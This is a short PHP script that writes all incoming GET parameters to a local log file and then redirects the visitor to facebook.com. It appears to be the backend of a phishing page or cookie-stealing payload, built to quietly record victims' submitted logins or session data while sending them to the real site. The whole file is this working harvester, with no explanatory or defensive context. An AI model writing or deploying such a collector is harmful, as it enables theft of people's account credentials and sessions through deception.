<?php
file_put_contents("logs.txt", print_r($_GET, true), FILE_APPEND);
header('Location: https://www.facebook.com');
?>
